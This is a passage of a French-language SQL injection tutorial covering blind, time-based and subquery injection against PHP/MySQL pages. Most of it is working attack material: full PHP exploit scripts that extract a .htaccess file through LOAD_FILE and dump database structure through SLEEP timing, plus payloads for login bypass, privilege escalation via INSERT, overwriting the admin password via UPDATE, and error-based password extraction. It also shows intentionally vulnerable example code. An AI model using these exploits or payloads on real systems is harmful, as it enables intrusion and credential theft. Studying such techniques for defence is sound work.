+	$db = mysql_connect('localhost', 'root', '') or die('Erreur de connection');
+	mysql_select_db('MaBase', $db) or die('Erreur de selection');
+	if(mysql_num_rows(mysql_query("SELECT id FROM membres WHERE pseudo='".$_POST['pseudo']."' AND password='".$_POST['pass']."'")) != 0)
+	{
+		// mécanisme d'authentification
+		header('Location: membre.php');
+	}
+	else
+		header('Location: erreur.php');
+}
+?>
+
+Les informations SQL sont les mêmes que pour la partie précédente.
+
+On remarque donc vite que les variables $_ POST['pseudo'] et $_POST['pass'] sont utilisées dans la requête sans aucune sécurisation (à noter tout de même que cela nécessite la directive de php magic_quotes_gpc à off). Et notre élément d'information est ici la page vers laquelle on est redirigée. En effet, si on envoie comme pseudo (sans s'occuper de la valeur du password, tant qu'elle est non nulle) l'injection suivante : ' OR 1=1 AND id=1# nous pouvons bypasser l'authentification (id=1 nous permettant de choisir sous quel profil nous nous connectons) et nous serons redirigé vers la page membre.php, alors que si nous envoyons n'importe quoi nous serons redirigé vers la page erreur.php.
+
+Nous avons donc mis en évidence l'injection SQL présente, mais usurper l'identité d'un des membres ne nous intéresse pas, ce que nous voulons c'est accéder au dossier admin qui est protégé par un fichier .htaccess. Ici commence l'exploitation de la « blind injection SQL » : construisons un exploit nous permettant de récupérer ce fichier.
+
+Après avoir vérifié que nous avons bien le privilège FILE, en vérifiant que l'injection suivante (toujours dans le pseudo) nous redirige bien vers membre.php :
+
+' OR 1=1 AND id=1 AND LOAD_FILE('/www/site/admin/.htaccess') IS NOT NULL #
+
+Nous allons devoir tester caractère par caractère le fichier .htaccess afin de le déterminer entièrement, et pour chaque test que nous ferons, nous devrons noter vers quelle page nous sommes redirigés, si c'est vers membre. php alors notre injection sera bonne, nous aurons deviné un caractère et nous pourrons passer au suivant. Cette méthode est très courante et se base sur la fonction SUBSTR qui nous permettra de récupérer un par un les différents caractères de la chaîne voulue. L'avantage est qu'au lieu de tester toutes les possibilités (soit 255Longueur si on considère que toute la table ascii peut être utilisée) on ne bruteforce qu'une lettre à la fois (donc au maximum 255xLongueur possibilités). Plutôt que de faire tout cela à la main, construisons un petit exploit que voici :
+
+<?php
+
+set_time_limit(0);
+$fichier = '/www/site/admin/.htaccess';
+$longueur = 0;
+$longueurMax = 1000;
+$break = FALSE;
+$resultat = '';
+# Détermination du nombre de caractères du fichier
+while($break === FALSE && $longueur < $longueurMax)
+{
+$longueur++;
+$reponse = send("'+OR+LENGTH(LOAD_FILE('".$fichier."'))=".$longueur.'#');
+if (eregi('membre.php', $reponse))
+$break = TRUE;
+}
+# Détermination des caractères du fichier un par un
+for($i=1 ; $i<=$longueur ;$i++)
+{
+$break = FALSE;
+$c = 97;
+while($break === FALSE && $c<255)
+{
+$c++;
+$reponse = send("'+OR+ASCII(SUBSTR(LOAD_FILE('".$fichier."'),".$i.",1))=".$c.'#');
+if (eregi('membre.php', $reponse))
+{
+$resultat .= chr($c);
+$break = TRUE;
+}
+}
+if($break === FALSE)
+$resultat .= '?';
+}
+# Affichage du résultat
+echo $resultat;
+# Fonction Send
+function send($injection)
+{
+if(($sock = fsockopen('127.0.0.1', 80)) === FALSE)
+echo 'Erreur de Connexion';
+else
+{
+$data = 'pseudo='.$injection.'&pass=a';
+$requete = "POST /login.php HTTP/1.1\r\n";
+$requete .= "Host: 127.0.0.1\r\n";
+$requete .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6 (.NET
+CLR 3.5.30729)\r\n";
+$requete .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
+$requete .= "Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3\r\n";
+$requete .= "Accept-Encoding: gzip,deflate\r\n";
+$requete .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
+$requete .= "Keep-Alive: 300\r\n";
+$requete .= "Connection: keep-alive\r\n";
+$requete .= "Referer: http://www.google.com\r\n";
+$requete .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$requete .= "Content-Length: ".strlen($data)."\r\n\r\n";
+$requete .= $data."\r\n";
+fputs($sock, $requete);
+$rep = '';
+while (!feof($sock))
+$rep .= fgets($sock, 1024);
+fclose($sock);
+return $rep;
+}
+}
+?>
+
+Les lignes importantes étant les suivantes, qui permettent respectivement de déterminer le nombre de caractères du fichier, et de tester la valeur d'un caractère (ou plus précisément de tester la valeur ASCII de ce caractère) :
+
+$reponse = send("'+OR+LENGTH(LOAD_FILE('".$fichier."'))=".$longueur.'#');
+$reponse = send("'+OR+ASCII(SUBSTR(LOAD_FILE('".$fichier."'),".$i.",1))=".$c.'#');
+
+Notre exploit fonctionne maintenant correctement, et nous sommes en mesure de récupérer des fichiers sur le serveur à partir d'une injection pour laquelle nous ne sommes pas en mesure d'afficher le résultat. L'inconvénient de cette méthode est qu'elle est tout de même longue et coûteuse, puisqu'elle envoie une requête pour chaque test de caractères, ce qui peut s'avérer très long si le fichier est volumineux (mais on pourrait diminuer un peu le nombre de requêtes en ne testant que les caractères « probables » et pas toute la table ascii...).
+
+Dans cet exemple, nous avons « bruteforcé » intelligemment le contenu d'un fichier grâce à la fonction LOAD_FILE, mais nous aurions bien entendu pu faire de même avec toute chaîne de caractère et récupérer n'importe quelle information de la même manière.
+
+2.3 - Total Blind
+
+Enfin, voyons le dernier type d'injection SQL : les requêtes qui ne renvoient aucun élément d'information, ni sur les résultats, ni sur l'état de réussite de la requête. Il nous faut alors trouver un nouveau facteur qui nous renseignera : le temps d'exécution de la requête ! En effet, si on réussi à ralentir considérablement l'exécution de notre requête, et que ce ralentissement traduise un état de réussite, alors on sera en mesure de connaître, comme pour une injection à l'aveugle « classique », si l'injection à réussi ou non, simplement en mesurant ce temps.
+
+Voyons tout de suite un exemple d'application. Le script mail.php suivant permet d'envoyer un mail à un membre en précisant le message à envoyer et l'id du membre. Une requête SQL est utilisée pour obtenir le mail du membre à partir de son id.
+
+<?php
+error_reporting(0);
+
+if(isset($_GET['id'],$_GET['msg']))
+{
+	mysql_connect('localhost', 'root', '');
+	mysql_select_db('MaBase');
+	$sql = mysql_query("SELECT mail FROM membres WHERE id=".mysql_real_escape_
+	string($_GET['id']));
+	$data = mysql_fetch_array($sql);
+	mail($data['email'], 'nouveau mail', $_GET['msg']);
+	echo 'mail envoyé';
+}
+else
+	header('Location : formulaire.php')
+?>
+
+Ici on remarque que la variable $_GET['id'] va nous permettre de réaliser une injection malgré la présence de mysql_real_escape_string, car elle n'est pas entourée de quotes. On pourra donc effectuer toutes les injections qui ne nécessitent pas de quotes. Mais avant cela il nous faut un moyen de ralentir le temps de la requête, pour cela nous avons deux fonctions très utiles : BENCHMARK et SLEEP. BENCHMARK(X, ACT) permet d'exécuter X fois l'opération ACT, et sert normalement à effectuer des tests de rapidité. Là où elle nous sera utile, c'est que répéter un grand nombre de fois une opération, même simple, prend toujours du temps (par exemple SELECT BENCHMARK( 1000000, MD5(0)) prend environ 3 secondes avec ma configuration). SLEEP(X) quant à elle, est une fonction qui permet simplement d'attendre X secondes, elle est donc plus simple que BENCHMARK et c'est celle que nous utiliserons ici.
+
+L'étape suivante consiste à exécuter la fonction SLEEP uniquement si notre injection retourne Vrai. MySQL nous propose pour cela la fonction IF, qui s'utilise comme ceci : SELECT IF(condition, valeur1, valeur2) elle retourne valeur1 si condition est vraie et valeur2 si elle est fausse.
+
+Maintenant, il ne nous reste plus qu'à mesurer le temps d'exécution de la requête. Rangez les chronomètres, nous allons coder un petit exploit, mais avant cela voyons un simple script qui nous permettra de visualiser concrètement ce que nous venons de voir :
+
+<?php
+$tempsDebut = microtime(TRUE);
+file_get_contents('http://site.com/mail.php?msg=a&id=1+AND+IF(1=2,SLEEP(3),NULL)');
+$tempsFin = microtime(TRUE);
+echo 'Temps de la 1ère requête : '.($tempsFin - $tempsDebut);
+$tempsDebut = microtime(TRUE);
+file_get_contents('http://site.com/mail.php?msg=a&id=1+AND+IF(1=1,SLEEP(3),NULL)');
+$tempsFin = microtime(TRUE);
+echo 'Temps de la 2ème requête : '.($tempsFin - $tempsDebut);
+?>
+
+Et nous obtenons quelque chose du genre :
+
+Temps de la 1ère requête :
+0.013152837753296
+Temps de la 2ème requête :
+3.0038139820099
+
+La différence de temps entre une expression fausse (1=2) et une expression vraie (1=1) est donc clairement visible. Passons maintenant à une injection plus poussée : nous savons qu'il existe plusieurs bases et plusieurs tables, que nous aimerions bien déterminer. Et nous avons vu dans la première partie que toutes ces informations sont regroupées dans une base appelée information_schema. Construisons donc un exploit capable d'exploiter notre requête avec une injection « total blind », qui nous permettra d'extraire la structure bases/tables.
+
+Nous savons que les noms des bases et des tables sont respectivement enregistrés dans les champs SCHEMATA.SCHEMA_NAME et TABLES.TABLE_NAME. Notre exploit va donc procéder ainsi :
+
+    Compter le nombre de bases et de tables ;
+    Déterminer leur nom ;
+    Construire les liens d'appartenance base/ table.
+
+Et il faudra aussi :
+
+    Mesurer le temps d'une requête classique (sans injection) pour fixer correctement le temps de détection d'une injection réussie, qui sera la somme du temps classique et du temps d'attente ;
+    Ne pas déterminer la structure des bases information_schema et mysql déjà connue.
+
+    Voilà la source complète, qui parle d'elle même :
+
+    <?php
+    # Paramètres de la cible
+    $host = '127.0.0.1';
+    $file = 'mail.php';
+    $var = 'msg=a&id';
+    # Paramètres du script
+    set_time_limit(0);
+    $tempsAttente = 2;
+    $nombreMaxDeTables = 100;
+    $nombreMaxDeBases = 10;
+    $longueurNomMax = 1000;
+    $tempsRequete = $tempsClassique = $tempsInitial = $tempsFinal = $tempsTotalInitial = $tempsTotalFinal = 0;
+    $resultatsGlobaux = Array();
+    $compteur = 0;
+    # 1ère étape : détermination du temps classique d'une requête
+    $tempsTotalInitial = $tempsInitial = microtime(TRUE);
+    send();
+    $tempsFinal = microtime(TRUE);
+    $tempsClassique = $tempsFinal - $tempsInitial;
+    # 2ème étape : détermination du nombre de bases, sans "information_schema" et "mysql"
+    $nombreDeBases = 0;
+    $break = FALSE;
+    while($break === FALSE && $nombreDeBases < $nombreMaxDeBases)
+    {
+    $tempsInitial = microtime(TRUE);
+    $injection = '-1+UNION+SELECT+IF(COUNT(SCHEMA_NAME)='.$nombreDeBases.',SLEEP('.$tempsAttente.'),NULL)+FROM+informatio
+    n_schema.SCHEMATA+WHERE+SCHEMA_NAME+NOT+IN+('.mysqlStringToChar('information_schema').','.mysqlStringToChar('mysql').')-
+    -';
+    send($injection);
+    $tempsFinal = microtime(TRUE);
+    $tempsRequete = $tempsFinal - $tempsInitial;
+    if($tempsRequete > 0.9*($tempsAttente+$tempsClassique))
+    $break = TRUE;
+    else
+    $nombreDeBases++;
+    }
+    $resultatsGlobaux['nombreDeBases'] = $nombreDeBases;
+    # 3ème étape : détermination du nombre de tables, sans celles qui appartiennent à "information_schema" et à "mysql"
+    $nombreDeTables = 0;
+    $break = FALSE;
+    while($break === FALSE && $nombreDeTables < $nombreMaxDeTables)
+    {
+    $tempsInitial = microtime(TRUE);
+    $injection = '-1+UNION+SELECT+IF(COUNT(TABLE_NAME)='.$nombreDeTables.',SLEEP('.$tempsAttente.'),NULL)+FROM+information_
+    schema.TABLES+WHERE+TABLE_SCHEMA+NOT+IN+('.mysqlStringToChar('information_schema').','.mysqlStringToChar('mysql').')--';
+    send($injection);
+    $tempsFinal = microtime(TRUE);
+    $tempsRequete = $tempsFinal - $tempsInitial;
+    if($tempsRequete > 0.9*($tempsAttente+$tempsClassique))
+    $break = TRUE;
+    else
+    $nombreDeTables++;
+    }
+    $resultatsGlobaux['nombreDeTables'] = $nombreDeTables;
+    # 4ème étape : détermination du nom des bases, sauf "information_schema" et "mysql"
+    $baseCourante = 0;
+    $basesNames = array();
+    $break1 = FALSE;
+    while($break1 === FALSE && $baseCourante < $nombreDeBases)
+    {
+    // on determine premièrement la longueur du nom
+    $break2 = FALSE;
+    $longueurNom = 0;
+    while($break2 === FALSE && $longueurNom < $longueurNomMax)
+    {
+    $tempsInitial = microtime(TRUE);
+    $injection = '-1+UNION+SELECT+DISTINCT+IF(LENGTH(SCHEMA_
+    NAME)='.$longueurNom.',SLEEP('.$tempsAttente.'),NULL)+FROM+information_schema.SCHEMATA+WHERE+SCHEMA_NAME+NOT+IN+('.
+    mysqlStringToChar('information_schema').','.mysqlStringToChar('mysql');
+    foreach($basesNames AS $basesName)
+    $injection .= ','.mysqlStringToChar($basesName);
+    $injection .= ')+LIMIT+1--';
+    send($injection);
+    $tempsFinal = microtime(TRUE);
+    $tempsRequete = $tempsFinal - $tempsInitial;
+    if($tempsRequete > 0.9*($tempsAttente+$tempsClassique))
+    $break2 = TRUE;
+    else
+    $longueurNom++;
+    }
+    //puis on bruteforce lettre par lettre
+    $positionLettre = 1;
+    $nomBaseCourante = '';
+    while($positionLettre <= $longueurNom)
+    {
+    $ascii = 1;
+    $break3 = FALSE;
+    while($break3 === FALSE && $ascii < 255)
+    {
+    $tempsInitial = microtime(TRUE);
+    $injection = '-1+UNION+SELECT+IF(SUBSTR(SCHEMA_NAME,'.$positionLettre.',1)=CHAR('.$ascii.'),SLEEP('.$tempsAttente.
+    '),NULL)+FROM+information_schema.SCHEMATA+WHERE+SCHEMA_NAME+NOT+IN+('.mysqlStringToChar('information_schema').','.
+    mysqlStringToChar('mysql');
+    foreach($basesNames AS $basesName)
+    $injection .= ','.mysqlStringToChar($basesName);
+    $injection .= ')+LIMIT+1--';
+    send($injection);
+    $tempsFinal = microtime(TRUE);
+    $tempsRequete = $tempsFinal - $tempsInitial;
+    if($tempsRequete > 0.9*($tempsAttente+$tempsClassique))
+    {
+    $nomBaseCourante .= chr($ascii);
+    $break3 = TRUE;
+    $positionLettre++;
+    }
+    else
+    $ascii++;
+    }
+    }
+    $basesNames[] = $nomBaseCourante;
+    $baseCourante++;
+    }
+    $resultatsGlobaux['nomsDesBases'] = $basesNames;
+    # 5ème étape : détermination du nom des tables, sauf celles qui appartiennent à "information_schema" et à "mysql"
+    $tableCourante = 0;
+    $tablesNames = array();
+    $break1 = FALSE;
+    while($break1 === FALSE && $tableCourante < $nombreDeTables)
+    {
+    // on détermine premièrement la longueur du nom
+    $break2 = FALSE;
+    $longueurNom = 0;
+    while($break2 === FALSE && $longueurNom < $longueurNomMax)
+    {
+    $tempsInitial = microtime(TRUE);
+    $injection = '-1+UNION+SELECT+IF(LENGTH(TABLE_NAME)='.$longueurNom.',SLEEP('.$tempsAttente.'),NULL)+FROM+information_
+    schema.TABLES+WHERE+TABLE_SCHEMA+NOT+IN+('.mysqlStringToChar('information_schema').','.mysqlStringToChar('mysql').')';
+    if(count($tablesNames) > 0)
+    {
+    $injection .= '+AND+TABLE_NAME+NOT+IN+(';
+    foreach($tablesNames AS $tablesName)
+    $injection .= mysqlStringToChar($tablesName).',';
+    $injection .= 'CHAR(0))';
+    }
+    $injection .= '+LIMIT+1--';
+    send($injection);
+    $tempsFinal = microtime(TRUE);
+    $tempsRequete = $tempsFinal - $tempsInitial;
+    if($tempsRequete > 0.9*($tempsAttente+$tempsClassique))
+    $break2 = TRUE;
+    else
+    $longueurNom++;
+    }
+    //puis on bruteforce lettre par lettre
+    $positionLettre = 1;
+    $nomTableCourante = '';
+    while($positionLettre <= $longueurNom)
+    {
+    $ascii = 1;
+    $break3 = FALSE;
+    while($break3 === FALSE && $ascii < 255)
+    {
+    $tempsInitial = microtime(TRUE);
+    $injection = '-1+UNION+SELECT+IF(SUBSTR(TABLE_NAME,'.$positionLettre.',1)=CHAR('.$ascii.'),SLEEP('.$tempsAttente.
+    '),NULL)+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA+NOT+IN+('.mysqlStringToChar('information_schema').','.
+    mysqlStringToChar('mysql').')';
+    if(count($tablesNames) > 0)
+    {
+    $injection .= '+AND+TABLE_NAME+NOT+IN+(';
+    foreach($tablesNames AS $tablesName)
+    $injection .= mysqlStringToChar($tablesName).',';
+    $injection .= 'CHAR(0))';
+    }
+    $injection .= '+LIMIT+1--';
+    send($injection);
+    $tempsFinal = microtime(TRUE);
+    $tempsRequete = $tempsFinal - $tempsInitial;
+    if($tempsRequete > 0.9*($tempsAttente+$tempsClassique))
+    {
+    $nomTableCourante .= chr($ascii);
+    $break3 = TRUE;
+    $positionLettre++;
+    }
+    else
+    $ascii++;
+    }
+    }
+    $tablesNames[] = $nomTableCourante;
+    $tableCourante++;
+    }
+    $resultatsGlobaux['nomsDesTables'] = $tablesNames;
+    # 6ème étape : détermination des liens d'appartenance entre tables et bases
+    $resultatsGlobaux['structure'] = Array();
+    foreach($basesNames AS $baseName)
+    {
+    $tablesDeBaseCourante = Array();
+    foreach($tablesNames AS $tableName)
+    {
+    $tempsInitial = microtime(TRUE);
+    $injection = '-1+UNION+SELECT+IF(TABLE_SCHEMA='.mysqlStringToChar($baseName).',SLEEP('.$tempsAttente.'),NULL)+FROM+infor
+    mation_schema.TABLES+WHERE+TABLE_NAME='.mysqlStringToChar($tableName).'+LIMIT+1--';
+    send($injection);
+    $tempsFinal = microtime(TRUE);
+    $tempsRequete = $tempsFinal - $tempsInitial;
+    if($tempsRequete > 0.9*($tempsAttente+$tempsClassique))
+    $tablesDeBaseCourante[] = $tableName;
+    }
+    $resultatsGlobaux['structure'][$baseName] = $tablesDeBaseCourante;
+    }
+    # 8ème étape : Informations sur l'exécution du script
+    $tempsTotalFinal = microtime(TRUE);
+    $resultatsGlobaux['tempsExecution'] = $tempsTotalFinal - $tempsTotalInitial;
+    $resultatsGlobaux['nombreRequetes'] = $compteur;
+    # 7ème étape : affichage de la structure
+    print_r($resultatsGlobaux['structure']);
+    # Fonctions
+    function send($injection='')
+    {
+    global $host,$file,$var,$compteur;
+    if(($sock = fsockopen($host, 80)) === FALSE)
+    return;//die('socket error');
+    else
+    {
+    $out = "GET $file?$var=$injection HTTP/1.1\r\n";
+    $out .= "Host: $host\r\n";
+    $out .= "Connection: Close\r\n\r\n";
+    fwrite($sock, $out);
+    while(!feof($sock))
+    fgets($sock, 1024);
+    fclose($sock);
+    $compteur++;
+    }
+    }
+    function mysqlStringToChar($string)
+    {
+    $char = 'CHAR(';
+    for($i=0 ; $i<strlen($string)-1 ; $i++)
+    $char .= ord(substr($string, $i, 1)).',';
+    $char .= ord(substr($string, strlen($string)-1, 1)).')';
+    return $char;
+    }
+    ?>
+
+    L'exploit étant relativement long, quelques explications s'imposent. Les requêtes importantes seront (dans l'ordre d'apparition du script, et sans les conversions utilisant CHAR pour plus de clarté ) :
+
+    ... -1 UNION SELECT IF(COUNT(SCHEMA_NAME)=X,SLEEP(2),NULL) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME NOT IN
+    ('information_schema','mysql')--
+
+    ... -1 UNION SELECT IF(COUNT(TABLE_NAME)=X,SLEEP(2),NULL) FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT IN
+    ('information_schema','mysql')--
+
+    Ces deux premières requêtes nous permettrons de compter le nombre de tables et de bases. Les requêtes pour bruteforcer le nom des tables seront ensuite :
+
+    ... -1 UNION SELECT IF(LENGTH(TABLE_NAME)=X,SLEEP(2),NULL) FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT
+      IN ('information_schema','mysql') AND TABLE_NAME NOT IN ('table1', 'table2') LIMIT 1--
+
+    ... -1 UNION SELECT IF(SUBSTR(TABLE_NAME,X,1)=CHAR(Y),SLEEP(2),NULL) FROM information_schema.TABLES WHERE TABLE_SCHEMA
+      NOT IN ('information_schema','mysql') AND TABLE_NAME NOT IN ('table1', 'table2') LIMIT 1--
+
+    Ces requêtes nous permettrons donc de déterminer premièrement la longueur du nom, puis les caractères du nom. Enfin pour les relations base/table on fera :
+
+    -1 UNION SELECT IF(TABLE_SCHEMA='NomDuneBase',SLEEP(2),NULL) FROM
+    information_schema.TABLES WHERE TABLE_NAME='NomDuneTable' LIMIT 1--
+
+    Et on obtient en sortie un tableau du genre :
+
+    Array
+    (
+    [Base1] => Array
+    (
+    [0] => table1
+    [1] => table2
+    )
+    [Base2] => Array
+    (
+    [0] => blabla
+    [0] => test
+    [0] => foo
+    )
+    )
+
+    On remarque que cet exploit aussi n'est pas tout à fait optimisé : il ne tient pas compte de la casse et on pourrait encore grandement diminuer le nombre de requêtes en ne testant qu'un « alphabet probable » au lieu de toute la table ascii...
+
+    Ceci conclut cette seconde partie où nous avons vu trois type courants d'injection SQL. Remarquons aussi que la compatibilité des attaques est descendante : on peut exploiter une requête pour laquelle les résultats sont affichés à la manière d'une injection « total blind » en se basant sur le temps, mais ça revient un peu à dégommer une mouche avec un tank ...
+    3 - Autres vecteurs d'injection
+
+    allons parcourir ici diverses attaques différant de celles vues dans les parties précédentes, moins classiques.
+
+    3.1 - Requêtes imbriquées
+
+    Jusqu'à présent, nous avons toujours réalisé nos injections en détournant une requête SELECT en rajoutant des clauses ORDER BY, GROUP BY, des conditions dans les clauses WHERE et HAVING et en joignant d'autres SELECT avec UNION. Mais bien entendu, ce n'est pas toujours possible, dans certains cas nous devrons utiliser les requêtes imbriquées (ou « subqueries » en anglais) qui nous permettent d'effectuer des « sous-requêtes » dans des requêtes.
+
+    Voici un exemple simple de requêtes imbriquées :
+
+    SELECT nom,prenom FROM habitants WHERE rue = (SELECT rue FROM habitants WHERE nom='Dupont' AND prenom='Martin' 
+    LIMIT 1)
+
+    Cette requête nous retournera les noms et prénoms de tous les habitants qui habitent dans la même rue que M. Martin Dupont. La clause LIMIT permet de s'assurer qu'on obtient bien un seul résultat, car la requête est légèrement différente s'il y en a plusieurs :
+
+    SELECT nom,prenom FROM habitants WHERE rue IN (SELECT rue FROM habitants WHERE nom='Dupont')
+
+    Cette fois ci on obtiendra tous les noms et prénoms des personnes habitants dans une des rues où réside quelqu'un dont le nom est Dupont (donc il peut cette fois y avoir plusieurs rues, car tous les Dupont n'habitent probablement pas la même rue).
+
+    Voyons maintenant quelques exemples pour lesquels les requêtes imbriquées vont nous permettre de mener à bien une injection SQL. Le premier est une page de news, qui permet de choisir si elles sont affichées par ordre chronologique, ou dans l'ordre inverse. Il met lui aussi en jeu une requête de type SELECT.
+
+    <?php
+    mysql_connect('localhost', 'root', '');
+    mysql_select_db('database');
+
+    $ordre = (isset($_GET['ordre'])) ? $_GET['ordre'] : 0;
+
+    if(($sql = mysql_query("SELECT * FROM news ORDER BY id ".$ordre)) === FALSE)
+    	echo 'Erreur de requête SQL : '.mysql_error();
+    else{
+    	if(mysql_num_rows($sql) == 0)
+    		echo 'C\'est fini';
+    	else
+    		while(($data = mysql_fetch_array($sql)) !== FALSE)
+    			echo $data['titre'].' : '.$data['contenu'];
+    }
+    ?>
+
+    L'accès normal au fichier se fait donc de cette manière : news. php?ordre=ASC ou news.php?ordre=DESC. On remarque donc que l'on peut injecter du code SQL dans la variable $ordre qui sera utilisée dans la clause ORDER BY de la requête. Malheureusement si on est tenté d'utiliser UNION on obtient l'erreur : Incorrect usage of UNION and ORDER BY car il faudrait entourer chaque requête SELECT avec des parenthèses. On ne peut donc pas interroger d'autres tables comme ceci, mais voyons ce que cela donne avec les requêtes imbriquées. D'une part il est possible de spécifier plusieurs champs pour ordonner la requête, et d'autre part le nom des champs peuvent être retournés par le résultat d'une requête, un exemple d'illustration : avec news. php?ordre=,(SELECT titre) la requête deviendra :
+
+    SELECT * FROM news ORDER BY id , (SELECT titre)
+
+    Et les résultats seront triés selon le champ id, puis selon le champ titre. Cela ne donnera aucune différence avec un tri juste selon le champ id, car id est probablement une clé primaire, mais cela nous permet de voir qu'il nous est possible d'effectuer une requête SELECT, et donc d'interroger d'autres tables, par exemple, on pourra déterminer la SELECT * FROM news ORDER BY id , (SELECT titre) valeur du champ password de la table membre en se ramenant à une injection « total blind » basée sur le temps, comme ceci :
+
+    news.php?ordre=,(SELECT IF(SUBSTR(password,1,1)=CHAR(97),SLEEP(3),NULL) FROM membres WHERE id=1)
+
+    car la requête deviendra :
+
+    SELECT * FROM news ORDER BY id ,(SELECT IF(SUBSTR(password,1,1)=CHAR(97),SLEEP(3),NULL) FROM membres WHERE id=1)
+
+    Avec le second exemple, on va se ramener à une injection à l'aveugle, mais cette fois ci pas basée sur le temps. Il fait intervenir une requête INSERT : il s'agit d'un livre d'or qui permet à des visiteurs d'enregistrer des messages.
+
+    <?php
+    mysql_connect('localhost', 'root', '');
+    mysql_select_db('database');
+
+    $msg = htmlentities(trim($_POST['msg']));
+
+    if(empty($msg))
+    	die('Veuillez entrer un message.');
+    	
+    if(mysql_query("INSERT INTO livredor (message) VALUES ('".$msg."')") === FALSE)
+    	echo 'Erreur : votre message n\'a pas été enregistré.';
+    else
+    	echo 'Votre message a bien été enregistré';
+    ?>
+
+    Ici, la faille vient du fait que la protection implémentée n'est pas adaptée à une requête SQL : htmlentities sert plutôt lors de l'affichage de données HTML. De plus l'argument ENT_QUOTES qui aurait permit de convertir les quotes n'est pas utilisé ici, une injection SQL est donc possible.
+
+    La structure de la table livredor est la suivante :
+
+    CREATE TABLE `livredor`
+    (
+    `id` int(11) NOT NULL AUTO_INCREMENT,
+    `message` varchar(255) NOT NULL,
+    PRIMARY KEY (`id`)
+    )
+
+    On remarque que le champ message ne peut pas être NULL, donc si on essaye d'effectuer un enregistrement pour lequel c'est le cas il se produira l'erreur Column 'message' cannot be null et on obtiendra le message Erreur : votre message n'a pas été enregistré. Et ce sera notre élément d'information pour notre « blind injection SQL » : nous allons (en injectant du code dans la variable $msg) utiliser une sous requête qui testera la valeur d'une lettre du champ password de la table membre, et qui renverra NULL si le test ne réussi pas et autre chose sinon. L'exploitation ressemblera à ça :
+
+    '+(SELECT IF(SUBSTR(password,1,1)=CHAR(97),1,NULL) FROM membres WHERE id=1)+'
+
+    et la requête finale sera :
+
+    INSERT INTO livredor (message) VALUES (''+(SELECT IF(SUBSTR(password,1,1)=CHAR(97),1,NULL) FROM membres WHERE 
+    id=1)+'')
+
+    Donc le message ici ne sera enregistré que si la valeur du test sur le champ password est vraie et on pourra déterminer peu à peu le pass du membre voulu (ici celui ayant l'id 1). Mais maintenant que l'on s'est bien compliqué les choses, on remarque qu'il existe une exploitation bien plus simple. Nous ne pouvons pas directement obtenir le mot de passe, car nous utilisons l'opérateur d'addition + (qui renvoie 0 si nous lui fournissons une chaine), et nous ne pouvons pas utiliser la fonction CONCAT, mais nous pouvons récupérer sa conversion en base 10 :
+
+    INSERT INTO livredor (message) VALUES (''+(SELECT CONV(password, 36, 10) FROM membres WHERE id=1)+'')
+
+    Il ne nous restera plus qu'à aller voir les messages enregistrés après ça. Mais pourquoi n'avons nous pas utilisé directement cette méthode ? Premièrement car elle nécessite d'avoir accès aux enregistrements, c'est le cas ici avec un livre d'or, mais s'il s'agit d'enregistrements de log ou de statistiques accessibles uniquement à l'admin ou certains utilisateurs, cette méthode tombe à l'eau... Aussi car cela ne marche que si le password contient exclusivement des caractères alphanumériques.
+
+    Pour finir on pourrait tout à fait reprendre ce même exemple avec un script d'édition des messages faisant intervenir une requête UPDATE, cela ne change quasiment rien (car les requêtes imbriquées peuvent être utilisées avec les commandes SELECT, INSERT, UPDATE, DELETE, SET et DO).
+
+    3.2 - Autre que SELECT
+
+    Comme nous l'avons déjà dit dans la partie d'avant, jusqu'à présent nous n'avons quasiment effectué des injections que dans des requêtes de type SELECT, mais comme le prouve la fin de cette même partie, il est tout à fait possible de détourner également des requêtes de tout type : INSERT, UPDATE, ALTER, DROP, ... Voici quelques brefs exemples :
+
+    Lors d'une inscription, imaginons l'enregistrement suivant :
+
+    mysql_query("INSERT INTO membres (pseudo, pass, rang) VALUES ('".$pseudo."', '".$pass."', 0)");
+
+    Nous voyons que rang est mis à 0, probablement qu'avec une autre valeur nous aurons plus de droits, on pourrait donc détourner la requête ainsi via la variable $pass :
+
+    INSERT INTO membres (pseudo, pass, rang) VALUES ('bla', '', 1)#',0)
+
+    Voyons maintenant une requête UPDATE qui permet de mettre à jour son mot de passe :
+
+    mysql_query("UPDATE membres SET password='".$newpass."' WHERE id=".$_SESSION['id']);
+
+    Et une manière de la réécrire à notre manière :
+
+    UPDATE membres SET password='lePassVoulu' WHERE id=-1 OR pseudo='admin'/*' WHERE id=5
+
+    Qui aura pour effet de changer le pass du compte ayant « admin » pour pseudo.
+
+    Les injections SQL ne se limitent donc pas aux requêtes SELECT, et les exemples sont encore nombreux.
+
+    3.3 - Injections basées sur une erreur
+
+    Certaines scripts vérifient que la requête s'est correctement, exécutée, un moyen parmi d'autre en PHP est de faire :
+
+    mysql_query($requete) or die('Erreur SQL.');
+
+    Dans le cas d'une injection « total blind », cela peut nous être bénéfique, et nous permettre de nous ramener à une injection à l'aveugle classique. En effet, si nous sommes en mesure de provoquer une erreur SQL uniquement si notre test échoue alors nous aurons notre élément d'information. Le problème est que les requêtes sont vérifiées avant exécution, et ne sont exécutées qu'une fois la vérification passée. Il nous faut donc trouver une requête qui provoquera une erreur à l'exécution, mais qui sera correcte syntaxiquement, et qui passera la vérification. Nous avons déjà vu qu'on pouvait retourner NULL pour les champs qui ne le supportent pas, mais cela ne marchera pas dans 100% des cas. Par contre l'erreur suivante si : Subquery returns more than 1 row car MySQL ne peut pas savoir le nombre de résultats que va retourner une sous-requête avant de l'exécuter. Nous pourrions donc construire un exploit basé sur ce principe :
+
+    ... AND 1=IF(ASCII(SUBSTR((SELECT password FROM membres WHERE id=1),1,1))=97,1,(SELECT 1 UNION SELECT 2))
+
+    Dans ce cas si la première lettre du password est un a, alors le IF retournera 1, la condition sera 1=1 et la requête s'exécutera normalement. Mais si ce n'est pas un a alors le IF retournera les résultats de la sous requête SELECT 1 UNION SELECT 2 et on obtiendra une erreur car on ne peut pas faire un test d'égalité entre un élément singulier et un groupe de résultats.
+
+    3.4 - SQL column truncation
+
+    On peut lire dans la documentation MySQL :
+
